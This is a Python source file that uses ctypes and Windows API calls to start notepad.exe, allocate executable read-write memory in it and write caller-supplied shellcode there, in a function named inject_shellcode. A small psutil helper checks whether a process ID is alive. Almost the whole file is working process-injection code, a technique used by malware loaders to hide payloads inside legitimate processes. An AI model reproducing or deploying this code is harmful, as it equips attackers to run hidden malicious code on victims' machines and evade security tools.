import ctypes
from ctypes import wintypes, Structure, sizeof, byref
import psutil

# this module from https://github.com/Adnnlnistrator/Memccl

# Manually define STARTUPINFOW structure
class STARTUPINFOW(Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

# Manually define PROCESS_INFORMATION structure
class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

# Define constants
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# Define Windows API functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [
    wintypes.HANDLE,
    wintypes.LPVOID,
    wintypes.LPCVOID,
    ctypes.c_size_t,
    ctypes.POINTER(ctypes.c_size_t)
]
WriteProcessMemory.restype = wintypes.BOOL

CreateProcess = kernel32.CreateProcessW
CreateProcess.argtypes = [
    wintypes.LPCWSTR,          # lpApplicationName
    wintypes.LPWSTR,           # lpCommandLine
    ctypes.c_void_p,           # lpProcessAttributes
    ctypes.c_void_p,           # lpThreadAttributes
    wintypes.BOOL,             # bInheritHandles
    wintypes.DWORD,            # dwCreationFlags
    ctypes.c_void_p,           # lpEnvironment
    wintypes.LPCWSTR,          # lpCurrentDirectory
    ctypes.POINTER(STARTUPINFOW),  # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION)  # lpProcessInformation
]
CreateProcess.restype = wintypes.BOOL

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL


# Load shellcode and inject into the target process
def inject_shellcode(shellcode, target_process=r"C:\Windows\System32\notepad.exe"):
    """
    Inject shellcode into a newly created process.

    :param shellcode: Raw shellcode data
    :param target_process: Target process name
    :return: Injection success status and injected address
    """
    startup_info = STARTUPINFOW()
    startup_info.cb = sizeof(STARTUPINFOW)  # Set structure size
    process_info = PROCESS_INFORMATION()

    # Create the target process
    if not CreateProcess(
        target_process,
        None,
        None,
        None,
        False,
        0,
        None,
        None,
        byref(startup_info),
        byref(process_info)
    ):
        raise Exception("Failed to create target process")

    try:
        # Allocate memory
        allocated_memory = VirtualAllocEx(
            process_info.hProcess,
            None,
            len(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        if not allocated_memory:
            raise Exception("Memory allocation failed")

        # Write shellcode
        written = ctypes.c_size_t()
        if not WriteProcessMemory(
            process_info.hProcess,
            allocated_memory,
            shellcode,
            len(shellcode),
            byref(written)
        ):
            raise Exception("Failed to write to memory")

        return True, allocated_memory, process_info.dwProcessId

    finally:
        CloseHandle(process_info.hProcess)
        CloseHandle(process_info.hThread)



def is_pid_running(pid):
    """
    Determine if the given PID is alive in the Windows system.

    Parameters:
        pid (int): The process ID to check.

    Returns:
        bool: Returns True if the process is alive, otherwise False.
    """
    try:
        # Get the process object for the specified PID
        process = psutil.Process(pid)
        # Check if the process is running
        return process.is_running()
    except psutil.NoSuchProcess:
        # If the process does not exist, catch the exception and return False
        return False
    except psutil.AccessDenied:
        # If permission is denied, also consider the process non-existent
        return False